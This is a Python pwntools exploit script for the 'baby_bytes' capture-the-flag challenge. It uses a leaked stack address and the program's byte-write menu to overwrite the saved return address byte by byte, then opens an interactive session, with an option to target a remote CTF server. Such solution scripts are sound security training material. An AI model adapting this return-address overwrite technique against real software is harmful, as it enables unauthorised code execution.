from pwn import *
# fill in binary name
elf = context.binary = ELF("./distrib/baby_bytes")
# fill in libc name
libc = ELF("./distrib/libc.so.6")
# fill in ld name
ld = ELF("./distrib/ld-linux-x86-64.so.2")

if args.REMOTE:
  # fill in remote address
  p = remote("challs.nusgreyhats.org", 33021)
else:
  p = process([ld.path, elf.path], env = {"LD_PRELOAD": libc.path})

WIN_ADDR = 0x4012b3

context.log_level = 'debug'

p.recvuntil(b"Here's your address of choice (pun intended): ")
choice_addr = p.recvline()[2:-1].decode()
choice_addr = bytes.fromhex(choice_addr)[::-1].ljust(8,b'\x00')
choice_addr = u64(choice_addr)
log.info(f"choice addr: {hex(choice_addr)}")
log.info(f"target: {hex(choice_addr + 0x14 + 0x8)}")
# pause()

# rewrite saved return address to the address of the win function byte by byte
p.sendlineafter(b"any byte\n", b"2")
p.sendlineafter(b"Enter the address of the byte you want to write to in hex:\n", hex(choice_addr + 0x14 + 0x8).encode())
p.sendlineafter(b"Enter the byte you want to change it to:\n", b"89")

p.sendlineafter(b"any byte\n", b"2")
p.sendlineafter(b"Enter the address of the byte you want to write to in hex:\n", hex(choice_addr + 0x14 + 0x8 + 1).encode())
p.sendlineafter(b"Enter the byte you want to change it to:\n", b"12")

p.sendlineafter(b"any byte\n", b"2")
p.sendlineafter(b"Enter the address of the byte you want to write to in hex:\n", hex(choice_addr + 0x14 + 0x8 + 2).encode())
p.sendlineafter(b"Enter the byte you want to change it to:\n", b"40")

p.sendlineafter(b"any byte\n", b"2")
p.sendlineafter(b"Enter the address of the byte you want to write to in hex:\n", hex(choice_addr + 0x14 + 0x8 + 3).encode())
p.sendlineafter(b"Enter the byte you want to change it to:\n", b"00")

p.sendlineafter(b"any byte\n", b"2")
p.sendlineafter(b"Enter the address of the byte you want to write to in hex:\n", hex(choice_addr + 0x14 + 0x8 + 4).encode())
p.sendlineafter(b"Enter the byte you want to change it to:\n", b"00")

p.sendlineafter(b"any byte\n", b"2")
p.sendlineafter(b"Enter the address of the byte you want to write to in hex:\n", hex(choice_addr + 0x14 + 0x8 + 5).encode())
p.sendlineafter(b"Enter the byte you want to change it to:\n", b"00")

p.sendlineafter(b"any byte\n", b"69")
# make the main function return, causing RIP to take the value of saved retaddr
p.interactive()